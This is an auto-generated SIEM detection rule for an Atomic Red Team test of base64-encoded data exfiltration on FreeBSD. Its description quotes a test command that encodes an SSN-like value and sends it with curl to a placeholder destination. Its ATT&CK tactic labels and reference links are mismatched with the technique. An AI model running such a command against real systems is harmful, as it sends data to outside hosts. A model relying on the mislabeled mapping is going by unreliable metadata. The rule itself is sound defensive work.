[rule]
author = [ "AtomicRedTeam-Automation",]
description = "Detection for specific test 'Base64 Encoded data (freebsd)' (GUID: 2d97c626-7652-449e-a986-b02d9051c298) of technique T1132.001 (Data Encoding: Standard Encoding). Test Description: Utilizing a common technique for posting base64 encoded data.. Command/Steps: echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}\n"
from = "now-9m"
rule_id = "2da6a4e8-34bb-441c-8486-5d2e38a7d400"
language = "kql"
name = "Atomic Test: T1132.001 - Base64 Encoded data (freebsd)"
output_index = ".siem-signals-default"
references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1132.001/T1132.001.yaml",]
risk_score = 50
severity = "medium"
tags = [ "AtomicRedTeam", "T1132.001", "2d97c626-7652-449e-a986-b02d9051c298", "linux",]
type = "query"
query = "(process.name : (\\\"sh\\\", \\\"bash\\\") OR process.parent.name : (\\\"sh\\\", \\\"bash\\\")) AND process.command_line : \\\"*111-11-1111*\\\" AND process.command_line : \\\"*b64encode*\\\" AND process.command_line : \\\"*curl*\\\""
version = 1
index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
[[rule.threat]]
framework = "MITRE ATT&CK"
[[rule.threat.technique]]
id = "T1132.001"
name = "Base64 Encoded data (freebsd)"
reference = "https://attack.mitre.org/techniques/T1132/001"

[[rule.threat.tactic]]
id = "TA0003"
name = "Persistence"
reference = "https://attack.mitre.org/techniques/T1132/001"

[[rule.threat.tactic]]
id = "TA0004"
name = "Privilege Escalation"
reference = "https://attack.mitre.org/techniques/T1132/001"

[[rule.threat.tactic]]
id = "TA0005"
name = "Defense Evasion"
reference = "https://attack.mitre.org/techniques/T1132/001"


